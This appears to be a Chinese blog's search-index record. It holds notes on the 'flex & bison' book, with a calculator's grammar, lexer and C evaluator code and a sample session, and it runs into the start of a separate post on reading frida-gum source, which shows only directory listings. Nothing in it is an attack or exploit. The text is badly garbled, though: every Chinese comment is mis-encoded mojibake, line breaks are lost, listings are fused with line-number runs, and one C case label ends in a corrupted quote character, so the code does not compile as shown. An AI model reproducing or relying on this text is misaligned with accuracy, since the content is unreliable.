&lt;a&gt; exp stmt list explist//åŒç†%type &lt;sl&gt; symlist%start calclist%%//è¯­å¥ï¼Œè°ƒç”¨ç›¸å¯¹åº”çš„æ–¹æ³•ï¼Œç”ŸæˆASTstmt: IF exp THEN list { $$ = newflow('I', $2, $4, NULL); } | IF exp THEN list ELSE list { $$ = newflow('I', $2, $4, $6); } | WHILE exp DO list { $$ = newflow('W', $2, $4, NULL); } | exp;//å³é€’å½’list: /* nothing */ { $$ = NULL; } | stmt ';' list { if ($3 == NULL) $$ = $1; else $$ = newast('L', $1, $3); } ;//è¡¨è¾¾å¼çš„astæ„å»ºexp: exp CMP exp { $$ = newcmp($2, $1, $3); } | exp '+' exp { $$ = newast('+', $1,$3); } | exp '-' exp { $$ = newast('-', $1,$3);} | exp '*' exp { $$ = newast('*', $1,$3); } | exp '/' exp { $$ = newast('/', $1,$3); } | '|' exp { $$ = newast('|', $2, NULL); } | '(' exp ')' { $$ = $2; } | '-' exp %prec UMINUS { $$ = newast('M', $2, NULL); } | NUMBER { $$ = newnum($1); } | FUNC '(' explist ')' { $$ = newfunc($1, $3); } | NAME { $$ = newref($1); } | NAME '=' exp { $$ = newasgn($1, $3); } | NAME '(' explist ')' { $$ = newcall($1, $3); };//è¡¨è¾¾å¼åˆ—è¡¨explist: exp | exp ',' explist { $$ = newast('L', $1, $3); };//ç¬¦å·åˆ—è¡¨ï¼Œç”¨äºå‡½æ•°è°ƒç”¨ï¼Œå³é€’å½’çš„symlist: NAME { $$ = newsymlist($1, NULL); } | NAME ',' symlist { $$ = newsymlist($1, $3); };//è®¡ç®—å™¨çš„é¡¶å±‚è§„åˆ™calclist: /* nothing */ | calclist stmt EOL { if(debug) dumpast($2, 0); printf(&quot;= %4.4g\\n&gt; &quot;, eval($2)); treefree($2); } //è¯†åˆ«ä¸€ä¸ªå‡½æ•°å£°æ˜ let xxx() = xxx è¿™æ ·çš„ | calclist LET NAME '(' symlist ')' '=' list EOL { dodef($3, $5, $8); printf(&quot;Defined %s\\n&gt; &quot;, $3-&gt;name); } | calclist error EOL { yyerrok; printf(&quot;&gt; &quot;); } ;%% è¯æ³•åˆ†æéƒ¨åˆ†ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879$ cat fb3-2.l/* Companion source code for &quot;flex &amp; bison&quot;, published by O'Reilly * Media, ISBN 978-0-596-15597-1 * Copyright (c) 2009, Taughannock Networks. All rights reserved. * See the README file for license conditions and contact info. * $Header: /home/johnl/flnb/code/RCS/fb3-2.l,v 2.1 2009/11/08 02:53:18 johnl Exp $ *//* recognize tokens for the calculator */%option noyywrap nodefault yylineno%{# include &quot;fb3-2.h&quot;# include &quot;fb3-2.tab.h&quot;%}/* float exponent */ æµ®ç‚¹æ•°ï¼Œeå¼€å¤´ï¼Œæ­£è´Ÿï¼Œè¿™æ˜¯æŒ‡æ•°éƒ¨åˆ†EXP ([Ee][-+]?[0-9]+)//æ“ä½œç¬¦å•æ“ä½œæ•°%% /* single character ops */&quot;+&quot; |&quot;-&quot; |&quot;*&quot; |&quot;/&quot; |&quot;=&quot; |&quot;|&quot; |&quot;,&quot; |&quot;;&quot; |&quot;(&quot; |&quot;)&quot; { return yytext[0]; }//åŒæ“ä½œæ•°æ“ä½œç¬¦ /* comparison ops */&quot;&gt;&quot; { yylval.fn = 1; return CMP; }&quot;&lt;&quot; { yylval.fn = 2; return CMP; }&quot;&lt;&gt;&quot; { yylval.fn = 3; return CMP; }&quot;==&quot; { yylval.fn = 4; return CMP; }&quot;&gt;=&quot; { yylval.fn = 5; return CMP; }&quot;&lt;=&quot; { yylval.fn = 6; return CMP; }//å…³é”®å­— /* keywords */&quot;if&quot; { return IF; }&quot;then&quot; { return THEN; }&quot;else&quot; { return ELSE; }&quot;while&quot; { return WHILE; }&quot;do&quot; { return DO; }&quot;let&quot; { return LET;}//å†…å»ºçš„ä¸€äº›å‡½æ•° /* built in functions */&quot;sqrt&quot; { yylval.fn = B_sqrt; return FUNC; }&quot;exp&quot; { yylval.fn = B_exp; return FUNC; }&quot;log&quot; { yylval.fn = B_log; return FUNC; }&quot;print&quot; { yylval.fn = B_print; return FUNC; } /* debug hack */&quot;debug&quot;[0-9]+ { debug = atoi(&amp;yytext[5]); printf(&quot;debug set to %d\\n&quot;, debug); }//å£°æ˜çš„å‡½æ•°çš„å‡½æ•°åï¼Œå­—æ¯å¼€å¤´ /* names */[a-zA-Z][a-zA-Z0-9]* { yylval.s = lookup(yytext); return NAME; }//æµ®ç‚¹æ•°[0-9]+&quot;.&quot;[0-9]*{EXP}? |&quot;.&quot;?[0-9]+{EXP}? { yylval.d = atof(yytext); return NUMBER; }//å…¶ä»–çš„ç¬¦å·&quot;//&quot;.*[ \\t] /* ignore white space */\\\\\\n printf(&quot;c&gt; &quot;); /* ignore line continuation */&quot;\\n&quot; { return EOL; }. { yyerror(&quot;Mystery character %c\\n&quot;, *yytext); }%% å‡½æ•°å®ç°ï¼Œæ„é€ astä»€ä¹ˆçš„ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546$ cat fb3-2funcs.c/* Companion source code for &quot;flex &amp; bison&quot;, published by O'Reilly * Media, ISBN 978-0-596-15597-1 * Copyright (c) 2009, Taughannock Networks. All rights reserved. * See the README file for license conditions and contact info. * $Header: /home/johnl/flnb/code/RCS/fb3-2funcs.c,v 2.1 2009/11/08 02:53:18 johnl Exp $ *//* * helper functions for fb3-2 */# include &lt;stdio.h&gt;# include &lt;stdlib.h&gt;# include &lt;stdarg.h&gt;# include &lt;string.h&gt;# include &lt;math.h&gt;# include &quot;fb3-2.h&quot;//è¿™äº›æ˜¯è¾…åŠ©å‡½æ•°ï¼šæ„é€ ç¬¦å·è¡¨ã€hashç®—æ³•ã€æŸ¥æ‰¾/* symbol table *//* hash a symbol */static unsignedsymhash(char *sym){ unsigned int hash = 0; unsigned c; while(c = *sym++) hash = hash*9 ^ c; return hash;}struct symbol *lookup(char* sym){ struct symbol *sp = &amp;symtab[symhash(sym)%NHASH]; int scount = NHASH; /* how many have we looked at */ while(--scount &gt;= 0) { if(sp-&gt;name &amp;&amp; !strcmp(sp-&gt;name, sym)) { return sp; } if(!sp-&gt;name) { /* new entry */ sp-&gt;name = strdup(sym); sp-&gt;value = 0; sp-&gt;func = NULL; sp-&gt;syms = NULL; return sp; } if(++sp &gt;= symtab+NHASH) sp = symtab; /* try the next entry */ } yyerror(&quot;symbol table overflow\\n&quot;); abort(); /* tried them all, table is full */}//è¿™æ˜¯æ„é€ astçš„å‡½æ•°ï¼Œæ ¹æ®å‚æ•°ï¼Œå¡«å……astçš„ç»“æ„ã€‚//å¡«å…… typeï¼ŒèŠ‚ç‚¹ä»€ä¹ˆçš„struct ast *newast(int nodetype, struct ast *l, struct ast *r){ struct ast *a = malloc(sizeof(struct ast)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = nodetype; a-&gt;l = l; a-&gt;r = r; return a;}//numberçš„aststruct ast *newnum(double d){ struct numval *a = malloc(sizeof(struct numval)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = 'K'; a-&gt;number = d; return (struct ast *)a;}//æ¯”è¾ƒè¡¨è¾¾å¼çš„aststruct ast *newcmp(int cmptype, struct ast *l, struct ast *r){ struct ast *a = malloc(sizeof(struct ast)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = '0' + cmptype; a-&gt;l = l; a-&gt;r = r; return a;}//å‡½æ•°çš„aststruct ast *newfunc(int functype, struct ast *l){ struct fncall *a = malloc(sizeof(struct fncall)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = 'F'; a-&gt;l = l; a-&gt;functype = functype; return (struct ast *)a;}//è°ƒç”¨çš„ast// call funcname();è¿™ç§struct ast *newcall(struct symbol *s, struct ast *l){ struct ufncall *a = malloc(sizeof(struct ufncall)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = 'C'; a-&gt;l = l; a-&gt;s = s; return (struct ast *)a;}//å¼•ç”¨çš„aststruct ast *newref(struct symbol *s){ struct symref *a = malloc(sizeof(struct symref)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = 'N'; a-&gt;s = s; return (struct ast *)a;}//èµ‹å€¼è¡¨è¾¾å¼ aststruct ast *newasgn(struct symbol *s, struct ast *v){ struct symasgn *a = malloc(sizeof(struct symasgn)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = '='; a-&gt;s = s; a-&gt;v = v; return (struct ast *)a;}//æ¡ä»¶è¡¨è¾¾å¼çš„aststruct ast *newflow(int nodetype, struct ast *cond, struct ast *tl, struct ast *el){ struct flow *a = malloc(sizeof(struct flow)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = nodetype; a-&gt;cond = cond; a-&gt;tl = tl; a-&gt;el = el; return (struct ast *)a;}//ç¬¦å·liststruct symlist *newsymlist(struct symbol *sym, struct symlist *next){ struct symlist *sl = malloc(sizeof(struct symlist)); if(!sl) { yyerror(&quot;out of space&quot;); exit(0); } sl-&gt;sym = sym; sl-&gt;next = next; return sl;}//é‡Šæ”¾ç¬¦å·listvoidsymlistfree(struct symlist *sl){ struct symlist *nsl; while(sl) { nsl = sl-&gt;next; free(sl); sl = nsl; }}//å®šä¹‰ä¸€ä¸ªå‡½æ•°//func(parma1,parma2â€¦);/* define a function */voiddodef(struct symbol *name, struct symlist *syms, struct ast *func){ if(name-&gt;syms) symlistfree(name-&gt;syms); if(name-&gt;func) treefree(name-&gt;func); name-&gt;syms = syms; name-&gt;func = func;}static double callbuiltin(struct fncall *);static double calluser(struct ufncall *);//astæ±‚å€¼doubleeval(struct ast *a){ double v; if(!a) { yyerror(&quot;internal error, null eval&quot;); return 0.0; } switch(a-&gt;nodetype) { /* constant */ case 'K': v = ((struct numval *)a)-&gt;number; break; /* name reference */ case 'N': v = ((struct symref *)a)-&gt;s-&gt;value; break; /* assignment */ case '=': v = ((struct symasgn *)a)-&gt;s-&gt;value = eval(((struct symasgn *)a)-&gt;v); break; /* expressions */ case '+': v = eval(a-&gt;l) + eval(a-&gt;r); break; case '-': v = eval(a-&gt;l) - eval(a-&gt;r); break; case '*': v = eval(a-&gt;l) * eval(a-&gt;r); break; case '/': v = eval(a-&gt;l) / eval(a-&gt;r); break; case '|': v = fabs(eval(a-&gt;l)); break; case 'M': v = -eval(a-&gt;l); break; /* comparisons */ case '1': v = (eval(a-&gt;l) &gt; eval(a-&gt;r))? 1 : 0; break; case '2': v = (eval(a-&gt;l) &lt; eval(a-&gt;r))? 1 : 0; break; case '3': v = (eval(a-&gt;l) != eval(a-&gt;r))? 1 : 0; break; case '4': v = (eval(a-&gt;l) == eval(a-&gt;r))? 1 : 0; break; case '5': v = (eval(a-&gt;l) &gt;= eval(a-&gt;r))? 1 : 0; break; case '6': v = (eval(a-&gt;l) &lt;= eval(a-&gt;r))? 1 : 0; break; //è¿™éƒ¨åˆ†æ˜¯å¯¹æ¡ä»¶è¡¨è¾¾å¼çš„astçš„æ±‚å€¼ //æ¯”å¦‚if else è¿™äº› /* control flow */ /* null if/else/do expressions allowed in the grammar, so check for them */ case 'Iâ€™: //æ¡ä»¶æˆç«‹ï¼Œèµ°thenæˆ–è€…doçš„åˆ†æ”¯ if( eval( ((struct flow *)a)-&gt;cond) != 0) { if( ((struct flow *)a)-&gt;tl) { v = eval( ((struct flow *)a)-&gt;tl); } else v = 0.0; /* a default value */ //ä¸æˆç«‹ï¼Œèµ°elseåˆ†æ”¯ } else { if( ((struct flow *)a)-&gt;el) { v = eval(((struct flow *)a)-&gt;el); } else v = 0.0; /* a default value */ } break; // whileè¯­å¥ case 'W': v = 0.0; /* a default value */ //æ¡ä»¶æˆç«‹ï¼Œèµ°doçš„é€»è¾‘ if( ((struct flow *)a)-&gt;tl) { while( eval(((struct flow *)a)-&gt;cond) != 0) v = eval(((struct flow *)a)-&gt;tl); } //ä¸æˆç«‹ï¼Œå‡‰å‡‰ï¼Œå•¥éƒ½ä¸åš break; /* last value is value */ //è¯­å¥åˆ—è¡¨ // case 'L': eval(a-&gt;l); v = eval(a-&gt;r); break; //å‡½æ•° //func(paramâ€¦); case 'F': v = callbuiltin((struct fncall *)a); break; //ç”¨æˆ·è°ƒç”¨éƒ¨åˆ† //æ¯”å¦‚ call xxx(); case 'C': v = calluser((struct ufncall *)a); break; default: printf(&quot;internal error: bad node %c\\n&quot;, a-&gt;nodetype); } return v;}//ä¸€äº›å†…å»ºå‡½æ•°çš„å®ç°ï¼Œccæ”¯æŒçš„static doublecallbuiltin(struct fncall *f){ enum bifs functype = f-&gt;functype; double v = eval(f-&gt;l); switch(functype) { case B_sqrt: return sqrt(v); case B_exp: return exp(v); case B_log: return log(v); case B_print: printf(&quot;= %4.4g\\n&quot;, v); return v; default: yyerror(&quot;Unknown built-in function %d&quot;, functype); return 0.0; }}//å‡½æ•°è°ƒç”¨çš„å®ç°ï¼Œæ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†ã€‚static doublecalluser(struct ufncall *f){ //è·å–å‡½æ•°çš„ä¿¡æ¯ï¼Œå‡½æ•°åï¼Œå‚æ•°ç­‰ struct symbol *fn = f-&gt;s; /* function name */ //å½¢å‚ struct symlist *sl; /* dummy arguments */ //å®å‚ struct ast *args = f-&gt;l; /* actual arguments */ //ä¿å­˜çš„å‚æ•° double *oldval, *newval; /* saved arg values */ double v; int nargs; int i; if(!fn-&gt;func) { yyerror(&quot;call to undefined function&quot;, fn-&gt;name); return 0; } //è·å–å‚æ•°æ•°é‡ï¼Œä»å½¢å‚åˆ—è¡¨éå†è·å¾— /* count the arguments */ sl = fn-&gt;syms; for(nargs = 0; sl; sl = sl-&gt;next) nargs++; //ä¸ºä¿å­˜å‚æ•°åˆ†é…ç©ºé—´ /* prepare to save them */ oldval = (double *)malloc(nargs * sizeof(double)); newval = (double *)malloc(nargs * sizeof(double)); if(!oldval || !newval) { yyerror(&quot;Out of space in %s&quot;, fn-&gt;name); return 0.0; } //å‚æ•°å¯èƒ½æ˜¯è¡¨è¾¾å¼ï¼Œæ‰€ä»¥éœ€è¦å¯¹å…¶æ±‚å€¼ã€‚ //æ¯”å¦‚ max(1+2,5) å°±éœ€è¦å¯¹ç¬¬ä¸€ä¸ªå‚æ•°å…ˆæ±‚å€¼ï¼Œç„¶åå†è¿›è¡Œè®¡ç®—ã€‚ /* evaluate the arguments */ for(i = 0; i &lt; nargs; i++) { if(!args) { yyerror(&quot;too few args in call to %s&quot;, fn-&gt;name); free(oldval); free(newval); return 0; } if(args-&gt;nodetype == 'L') { /* if this is a list node */ newval[i] = eval(args-&gt;l); args = args-&gt;r; } else { /* if it's the end of the list */ newval[i] = eval(args); args = NULL; } } //ä¿å­˜å½¢å‚çš„æ—§å€¼ï¼Œç„¶åæ›´æ–°æ–°å€¼ //æ¯”å¦‚ max(1+2,4-1) æ›´æ–°æˆ max(3ï¼Œ3) /* save old values of dummies, assign new ones */ sl = fn-&gt;syms; for(i = 0; i &lt; nargs; i++) { struct symbol *s = sl-&gt;sym; oldval[i] = s-&gt;value; s-&gt;value = newval[i]; sl = sl-&gt;next; } free(newval); /* evaluate the function */ //å‚æ•°éƒ½æ›´æ–°å®Œäº†ä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥å»è®¡ç®—å‡½æ•°å€¼äº† v = eval(fn-&gt;func); /* put the dummies back */ //å› ä¸ºä¹‹å‰æ›´æ”¹äº†å½¢å‚çš„listï¼Œç°åœ¨è¦æ¢å¤ sl = fn-&gt;syms; for(i = 0; i &lt; nargs; i++) { struct symbol *s = sl-&gt;sym; s-&gt;value = oldval[i]; sl = sl-&gt;next; } free(oldval); return v;}//é‡Šæ”¾èŠ‚ç‚¹ï¼Œåˆ†æƒ…å†µï¼Œå› ä¸ºä¸åŒçš„æ“ä½œç¬¦ï¼Œå­æ ‘æ•°ç›®ä¸åŒï¼Œæ‰€ä»¥è¦åˆ†æƒ…å†µã€‚voidtreefree(struct ast *a){ switch(a-&gt;nodetype) { /* two subtrees */ case '+': case '-': case '*': case '/': case '1': case '2': case '3': case '4': case '5': case '6': case 'L': treefree(a-&gt;r); /* one subtree */ case '|': case 'M': case 'C': case 'F': treefree(a-&gt;l); /* no subtree */ case 'K': case 'N': break; case '=': free( ((struct symasgn *)a)-&gt;v); break; case 'I': case 'W': free( ((struct flow *)a)-&gt;cond); if( ((struct flow *)a)-&gt;tl) free( ((struct flow *)a)-&gt;tl); if( ((struct flow *)a)-&gt;el) free( ((struct flow *)a)-&gt;el); break; default: printf(&quot;internal error: free bad node %c\\n&quot;, a-&gt;nodetype); } free(a); /* always free the node itself */}voidyyerror(char *s, ...){ va_list ap; va_start(ap, s); fprintf(stderr, &quot;%d: error: &quot;, yylineno); vfprintf(stderr, s, ap); fprintf(stderr, &quot;\\n&quot;);}intmain(){ printf(&quot;&gt; &quot;); return yyparse();}//æŠŠast dumpå‡ºæ¥åšæ˜¾ç¤ºï¼Œæ–¹ä¾¿è°ƒè¯•/* debugging: dump out an AST */int debug = 0;voiddumpast(struct ast *a, int level){ printf(&quot;%*s&quot;, 2*level, &quot;&quot;); /* indent to this level */ level++; if(!a) { printf(&quot;NULL\\n&quot;); return; } switch(a-&gt;nodetype) { /* constant */ case 'K': printf(&quot;number %4.4g\\n&quot;, ((struct numval *)a)-&gt;number); break; /* name reference */ case 'N': printf(&quot;ref %s\\n&quot;, ((struct symref *)a)-&gt;s-&gt;name); break; /* assignment */ case '=': printf(&quot;= %s\\n&quot;, ((struct symref *)a)-&gt;s-&gt;name); dumpast( ((struct symasgn *)a)-&gt;v, level); return; /* expressions */ case '+': case '-': case '*': case '/': case 'L': case '1': case '2': case '3': case '4': case '5': case '6': printf(&quot;binop %c\\n&quot;, a-&gt;nodetype); dumpast(a-&gt;l, level); dumpast(a-&gt;r, level); return; case '|': case 'M': printf(&quot;unop %c\\n&quot;, a-&gt;nodetype); dumpast(a-&gt;l, level); return; case 'I': case 'W': printf(&quot;flow %c\\n&quot;, a-&gt;nodetype); dumpast( ((struct flow *)a)-&gt;cond, level); if( ((struct flow *)a)-&gt;tl) dumpast( ((struct flow *)a)-&gt;tl, level); if( ((struct flow *)a)-&gt;el) dumpast( ((struct flow *)a)-&gt;el, level); return; case 'F': printf(&quot;builtin %d\\n&quot;, ((struct fncall *)a)-&gt;functype); dumpast(a-&gt;l, level); return; case 'C': printf(&quot;call %s\\n&quot;, ((struct ufncall *)a)-&gt;s-&gt;name); dumpast(a-&gt;l, level); return; default: printf(&quot;bad %c\\n&quot;, a-&gt;nodetype); return; }} 0x03: ä½¿ç”¨æµ‹è¯•ç¯å¢ƒ ubuntu 16.04 x64è¿™éƒ¨åˆ†æ²¡å•¥æ„æ€ï¼Œéšä¾¿æµ‹è¯•ä¸‹å°±å¥½äº†ï¼Œä¸»è¦è¿˜æ˜¯çœ‹ä¸Šé¢çš„ä»£ç ã€‚ 123# muhe @ ubuntu in ~/flexbison [20:49:52] $ ./fb3-2 &gt; 1+123 = 124 &gt; 1 = 1 &gt; 2 = 2 &gt; 1.1+2 = 3.1 &gt; 3.33333/1.2344 = 2.7&gt; let max(x,y) = if x &gt;= y then x;else y;; Defined max &gt; max(0.1,-0.2) = 0.1 &gt; max(99999999999999999999999999999999999999999,999999999999999999999999999999999999999999999999999999999999999999999999999) = 1e+75 &gt; è®¾ç½®äº†debugä¹‹åå¯ä»¥çœ‹åˆ°astï¼Œæ–¹ä¾¿è°ƒè¯•ï¼š 123&gt; let max(x,y) = if x &gt;= y then x;else y;; Defined max &gt; max(1,2) call max binop L number 1 number 2 = 2 &gt; &gt; 0x04: sqlåˆ†æä¹¦ä¸­ç¬¬å››ç« æ˜¯ä¸€ä¸ªsqlçš„åˆ†æå™¨ï¼Œå«è¯æ³•åˆ†æã€è¯­æ³•åˆ†æï¼Œä»£ç é‡è¿˜å¥½ä¸ç®—ç‰¹åˆ«å¤§ã€‚ ç›®å½•ç»“æ„: 123456789$ tree ..â”œâ”€â”€ Makefileâ”œâ”€â”€ glrmysql.l #mysqlå­é›†è¯æ³•åˆ†æå™¨â”œâ”€â”€ glrmysql.y #mysqlå­é›†è¯­æ³•åˆ†æå™¨â”œâ”€â”€ lpmysql.lâ”œâ”€â”€ lpmysql.yâ”œâ”€â”€ pmysql.lâ””â”€â”€ pmysql.y *.læ˜¯è¯æ³•åˆ†æéƒ¨åˆ†ï¼Œ*.yæ˜¯è¯­æ³•åˆ†æéƒ¨åˆ†ã€‚ è¿™é‡Œæœ‰ä¸‰ä»½ä»£ç ï¼Œglrxxxxxæ˜¯ç¬¬å››ç« çš„ä»£ç ï¼Œlpmxxxxæ˜¯ç¬¬å…«ç« çš„ä»£ç ï¼Œpmysqlxxæ˜¯ç¬¬ä¹ç« çš„ä»£ç ï¼Œè¿™é‡Œåªçœ‹ç¬¬å››ç« çš„ä»£ç ï¼Œè¿™ä¸ªä¾‹å­æ¯”è¾ƒç®€å•ï¼Œç®€åŒ–äº†å¾ˆå¤šä¸œè¥¿ã€‚ 0x05: å¼•ç”¨åœ¨ç¼–ç¨‹æ¦‚å¿µä¸­ï¼Œè¡¨è¾¾å¼å’Œè¯­å¥åˆ†åˆ«æ˜¯ä»€ä¹ˆæ¦‚å¿µï¼Ÿå·¦é€’å½’","link":"/2018/01/06/flex-bison%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"title":"frida-gumä»£ç é˜…è¯»ç¬”è®°","text":"0x00 : å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†frida : fridaæ˜¯ä¸€ä¸ªä¼˜ç§€çš„è·¨å¹³å°Dynamic instrumentation toolkitï¼Œå…·ä½“å¯ä»¥çœ‹å®˜ç½‘ä»‹ç» GObjectå¯¹è±¡ç³»ç»Ÿ GObjectè¿™ä¸ªæ¯”è¾ƒé‡è¦ï¼Œå› ä¸ºfridaæ¡†æ¶åº•å±‚çš„hookæ¡†æ¶Frida-gumæ˜¯çº¯cå†™çš„ï¼Œä¸ºäº†å®ç°ä¸€äº›é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ï¼Œä½¿ç”¨äº†Gobjectã€‚ æ³¨ï¼šæœ¬ç¯‡ä¸»è¦æ˜¯çœ‹interceptorè¿™ç§hookæ–¹å¼ï¼Œé’ˆå¯¹å‡½æ•°å¤´ï¼Œä¹‹åä¼šæœ‰ä¸€ç¯‡é’ˆå¯¹Stalker æ¨¡å¼çš„åˆ†æã€‚ 0x01 : é¡¹ç›®æ„æ¶ç›´æ¥æ‹‰ä¸‹æ¥çš„ä»£ç å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132â•­â”€muhe@muheMacBookPro ~/Code/frida â€¹master*â€ºâ•°â”€$ ltotal 137608drwxr-xr-x 29 muhe staff 928B Nov 13 17:22 .drwxr-xr-x 90 muhe staff 2.8K Nov 5 16:44 ..drwxr-xr-x 15 muhe staff 480B Nov 15 18:23 .git-rw-r--r-- 1 muhe staff 383B Jan 21 2019 .gitignore-rw-r--r-- 1 muhe staff 886B Jan 21 2019 .gitmodulesdrwxr-xr-x 3 muhe staff 96B Nov 13 17:22 .vscode-rw-r--r-- 1 muhe staff 2.4K Jan 21 2019 COPYING-rw-r--r-- 1 muhe staff 1.2K Nov 7 18:11 Makefile-rw-r--r-- 1 muhe staff 28K Nov 7 18:11 Makefile.linux.mk-rw-r--r-- 1 muhe staff 28K Nov 7 18:11 Makefile.macos.mk-rw-r--r-- 1 muhe staff 21K Nov 7 18:11 Makefile.sdk.mk-rw-r--r-- 1 muhe staff 84K Apr 29 2019 Makefile.toolchain.mk-rw-r--r-- 1 muhe staff 1.7K Nov 7 18:11 README.mddrwxr-xr-x 10 muhe staff 320B Nov 11 14:59 builddrwxr-xr-x 61 muhe staff 1.9K Jan 21 2019 capstone-rw-r--r-- 1 muhe staff 1.0K Nov 7 18:11 config.mkdrwxr-xr-x 9 muhe staff 288B Jan 21 2019 frida-clrdrwxr-xr-x 21 muhe staff 672B Jan 21 2019 frida-coredrwxr-xr-x 20 muhe staff 640B Nov 11 17:37 frida-gumdrwxr-xr-x 15 muhe staff 480B Jan 21 2019 frida-nodedrwxr-xr-x 20 muhe staff 640B Jan 21 2019 frida-pythondrwxr-xr-x 27 muhe staff 864B Jan 21 2019 frida-qmldrwxr-xr-x 10 muhe staff 320B Jan 21 2019 frida-swiftdrwxr-xr-x 12 muhe staff 384B Jan 21 2019 frida-tools-rw-r--r-- 1 muhe staff 25K Nov 7 18:11 frida.sln-rw-r--r-- 1 muhe staff 9.0K Nov 11 14:43 frida.srctrlbm-rw-r--r-- 1 muhe staff 67M Nov 11 14:43 frida.srctrldb-rw-r--r-- 1 muhe staff 6.1K Nov 11 14:35 frida.srctrlprjdrwxr-xr-x 47 muhe staff 1.5K Nov 7 18:11 releng frida-gumæ˜¯åº•å±‚hookæ¡†æ¶ï¼Œè·¨å¹³å°ï¼› frida-python , frida-nodeå•¥çš„æ˜¯ bindingsï¼Œæš‚æ—¶ä¸ç®¡ï¼Œä¸ç†è§£åŸç†çœ‹ä¹Ÿçœ‹ä¸æ‡‚ï¼› capstone ç‰›é€¼çš„åæ±‡ç¼–æ¡†æ¶ï¼Œfrida-gumä¸­ç”¨åˆ°äº†ï¼Œç”¨äºæŒ‡ä»¤çš„è¯»ï¼› releng ç¼–è¯‘ç›¸å…³çš„ï¼› frida-core server/agentç›¸å…³ï¼› frida-tools ä¸€äº›å·¥å…·ï¼Œæ¯”å¦‚frida-pså•¥çš„ã€‚ é‡ç‚¹æ˜¯frida-gum ï¼Œè¿™æ˜¯ç†è§£è¿™ä¸ªæ¡†æ¶çš„åŸºç¡€ã€‚ 0x02 : é˜…è¯»frida-gum (x86ä¸ºä¾‹)frida-gum æ³¨é‡Šå¹¶ä¸å¤šï¼Œç”šè‡³å¯ä»¥è¯´å‡ ä¹æ²¡ï¼Œå¥½åœ¨ä»–ä»£ç å†™å¾—å¥½ï¼Œæ„æ¶åˆç†ä»£ç è§„èŒƒå¥½ï¼Œæ‰€ä»¥é˜…è¯»èµ·æ¥å¤šè¯»å‡ éï¼Œæ€»ä¼šçœ‹æ‡‚çš„ã€‚ 2.1. æ„æ¶è¿™ä¸ªçš„æ¡†æ¶çš„æ„æ¶å¦‚ä¸‹ï¼š 123456789101112131415161718192021total 200drwxr-xr-x 20 muhe staff 640B Nov 11 17:37 .drwxr-xr-x 29 muhe staff 928B Nov 13 17:22 ..-rw-r--r-- 1 muhe staff 34B Jan 21 2019 .git-rw-r--r-- 1 muhe staff 70B Jan 21 2019 .gitignoredrwxr-xr-x 3 muhe staff 96B Nov 11 17:37 .vscode-rw-r--r-- 1 muhe staff 5.6K Jan 21 2019 COPYINGdrwxr-xr-x 5 muhe staff 160B Jan 21 2019 bindings-rw-r--r-- 1 muhe staff 2.1K Jan 21 2019 config.h.indrwxr-xr-x 3 muhe staff 96B Jan 21 2019 extdrwxr-xr-x 85 muhe staff 2.7K Jan 21 2019 gum-rw-r--r-- 1 muhe staff 5.1K Jan 21 2019 gum-32.vcxproj-rw-r--r-- 1 muhe staff 16K Jan 21 2019 gum-32.vcxproj.filters-rw-r--r-- 1 muhe staff 5.1K Jan 21 2019 gum-64.vcxproj-rw-r--r-- 1 muhe staff 16K Jan 21 2019 gum-64.vcxproj.filters-rw-r--r-- 1 muhe staff 8.5K Jan 21 2019 gum-common.propsdrwxr-xr-x 4 muhe staff 128B Jan 21 2019 libs-rw-r--r-- 1 muhe staff 6.8K Jan 21 2019 meson.build-rw-r--r-- 1 muhe staff 190B Jan 21 2019 meson_options.txtdrwxr-xr-x 28 muhe staff 896B Jan 21 2019 testsdrwxr-xr-x 7 muhe staff 224B Jan 21 2019 vapi æ ¸å¿ƒæ˜¯åœ¨gumç›®å½•ä¸‹ 12345678910111213141516171819gumâ”œâ”€â”€ arch-armâ”œâ”€â”€ arch-arm64â”œâ”€â”€ arch-mipsâ”œâ”€â”€ arch-x86â”œâ”€â”€ backend-armâ”œâ”€â”€ backend-arm64â”œâ”€â”€ backend-darwinâ”œâ”€â”€ backend-dbghelpâ”œâ”€â”€ backend-elfâ”œâ”€â”€ backend-libdwarfâ”œâ”€â”€ backend-libunwindâ”œâ”€â”€ backend-linuxâ”œâ”€â”€ backend-mipsâ”œâ”€â”€ backend-posixâ”œâ”€â”€ backend-qnxâ”œâ”€â”€ backend-windowsâ””â”€â”€ backend-x86....// gumä¸‹å…¶ä»–æ–‡ä»¶ è¿™é‡Œæœ‰å¿…è¦è¯´ä¸€ä¸‹ï¼Œfrida-gum 